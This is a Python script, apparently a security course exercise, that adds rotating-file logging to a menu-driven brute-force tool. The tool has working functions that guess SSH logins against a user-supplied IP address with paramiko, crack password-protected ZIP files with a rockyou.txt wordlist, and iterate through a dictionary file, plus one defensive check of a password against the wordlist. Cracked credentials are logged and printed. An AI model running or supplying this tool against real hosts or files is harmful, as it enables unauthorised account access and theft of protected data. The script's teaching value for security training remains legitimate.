#!/usr/bin/env python3

# Script Name:                  Add Logging to a script
# Author:                       Brad Baack
# Date of latest revision:      06/3/2024
# Purpose:                      Create logs for Brute force attack

import time  # Import time module for delays
import getpass  # Import getpass module to securely get user passwords
import os  # Import os module for file system operations
import paramiko  # Import paramiko for SSH connections
import zipfile  # Import zipfile for handling zip files
import logging  # Import logging module
from logging.handlers import RotatingFileHandler  # Import RotatingFileHandler for log rotation

# [MOD] Configure logging with rotation, file, and stream handlers
def setup_logger(log_file):
    logger = logging.getLogger("BruteForceLog")
    logger.setLevel(logging.DEBUG)
    
    # [MOD] Add a rotating handler
    rotating_handler = RotatingFileHandler(log_file, maxBytes=2000, backupCount=5)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    rotating_handler.setFormatter(formatter)
    
    # [MOD] Add a file handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setFormatter(formatter)
    
    # [MOD] Add a stream handler
    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(formatter)
    
    # [MOD] Add handlers to the logger
    logger.addHandler(rotating_handler)
    logger.addHandler(file_handler)
    logger.addHandler(stream_handler)
    
    return logger

# [MOD] Setup logger
logger = setup_logger('brute_force.log')

# Function to read lines from a file with optional delay
def read_file(filepath, delay=0):
    if not os.path.isfile(filepath):  # Check if the file exists
        logger.error(f"File not found: {filepath}")  # [MOD] Log file not found error
        return None
    with open(filepath, encoding="ISO-8859-1") as file:  # Open file with specified encoding
        for line in file:
            yield line.rstrip()  # Remove trailing whitespace and yield the line
            if delay:
                time.sleep(delay)  # Delay for specified time if delay is set

# Function to iterate through words in a dictionary file
def iterator():
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    for word in read_file(filepath, delay=1):  # Read file with 1-second delay between lines
        if word is None:
            return
        logger.info(f"Read word: {word}")  # [MOD] Log each word read
        print(word)

# Function to check if a password is in a dictionary file
def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ")
    usr_filepath = input("Enter a dictionary filepath:\n") or "rockyou.txt"
    wordlist = list(read_file(usr_filepath))  # Read file into a list
    if wordlist is None:
        return

    if usr_password not in wordlist:  # Check if password is not in wordlist
        logger.info("Password is acceptable.")  # [MOD] Log acceptable password
        print("Your password is acceptable. Good job.")
    else:
        logger.warning("Password found in dictionary.")  # [MOD] Log password found in dictionary
        print("Your password was found in the dictionary. Please choose another password.")

# Function to perform a brute force SSH attack
def brute_force_ssh():
    ip = input("Enter the target IP address:\n")
    username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    wordlist = read_file(filepath)
    if wordlist is None:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host key

    for password in wordlist:
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)  # Attempt SSH connection
            logger.info(f"Success! Username: {username} Password: {password}")  # [MOD] Log successful login
            print(f"Success! Username: {username} Password: {password}")
            break
        except paramiko.AuthenticationException:
            logger.warning(f"Failed: {password}")  # [MOD] Log failed password attempt
            print(f"Failed: {password}")
        except Exception as e:
            logger.error(f"Connection error: {e}")  # [MOD] Log connection error
            print(f"Connection error: {e}")
            break
    ssh.close()  # Close SSH connection

# Function to perform a brute force attack on a password-protected zip file
def brute_force_zip():
    zip_filepath = input("Enter the path to the password-protected zip file:\n")
    dict_filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    wordlist = read_file(dict_filepath)
    if wordlist is None:
        return

    with zipfile.ZipFile(zip_filepath) as zf:  # Open the zip file
        for password in wordlist:
            try:
                zf.extractall(pwd=bytes(password, 'utf-8'))  # Try to extract files with the password
                logger.info(f"Success! Password: {password}")  # [MOD] Log successful password
                print(f"Success! Password: {password}")
                break
            except RuntimeError:
                logger.warning(f"Failed: {password}")  # [MOD] Log failed password attempt
                print(f"Failed: {password}")
            except zipfile.BadZipFile:
                logger.error(f"Bad zip file: {zip_filepath}")  # [MOD] Log bad zip file error
                print(f"Bad zip file: {zip_filepath}")
                break

# Main function to handle menu and user input
def main():
    while True:
        print("\nBrute Force Wordlist Attack Tool Menu")
        print("1 - Offensive, Dictionary Iterator")
        print("2 - Defensive, Password Recognized")
        print("3 - Offensive, SSH Brute Force")
        print("4 - Offensive, ZIP Brute Force")
        print("5 - Exit")
        
        mode = input("Please enter a number: ")
        if mode == "1":
            iterator()  # Call iterator function
        elif mode == "2":
            check_password()  # Call check_password function
        elif mode == "3":
            brute_force_ssh()  # Call brute_force_ssh function
        elif mode == "4":
            brute_force_zip()  # Call brute_force_zip function
        elif mode == "5":
            break  # Exit the loop
        else:
            logger.warning("Invalid selection")  # [MOD] Log invalid input
            print("Invalid selection...")  # Handle invalid input

if __name__ == "__main__":
    main()  # Run the main function if the script is executed directly

# Resources
# https://www.howtogeek.com/435903/what-are-stdin-stdout-and-stderr-on-linux/
# https://dotnettutorials.net/lesson/logging-module-in-python/
# https://docs.python.org/3/howto/logging.html#logging-basic-tutorial
# https://realpython.com/python-logging/#using-handlers
# ChatGPT for integration of the logging features
